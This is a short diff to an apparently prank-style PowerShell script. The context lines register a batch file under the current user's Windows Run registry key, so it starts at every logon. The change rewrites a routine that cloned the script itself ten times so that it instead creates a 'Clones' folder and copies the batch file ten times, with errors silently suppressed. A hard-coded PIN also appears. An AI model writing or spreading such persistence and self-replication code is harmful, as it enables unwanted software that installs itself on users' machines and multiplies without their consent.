@@ -17,10 +17,15 @@ if (Test-Path $batchPath) {
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BigScrollLock" -Value $batchPath
 }
 
-# Clone self 10 times
-1..10 | ForEach-Object {
-    $dest = Join-Path $PSScriptRoot "rainbow_clone_$_.ps1"
-    Copy-Item -Path $PSCommandPath -Destination $dest -Force -ErrorAction SilentlyContinue
+# Create folder and clone batch file 10 times
+$cloneFolder = Join-Path $PSScriptRoot "Clones"
+New-Item -Path $cloneFolder -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+
+if (Test-Path $batchPath) {
+    1..10 | ForEach-Object {
+        $dest = Join-Path $cloneFolder "rnd_clone_$_.bat"
+        Copy-Item -Path $batchPath -Destination $dest -Force -ErrorAction SilentlyContinue
+    }
 }
 
 $PIN = 'dumb'
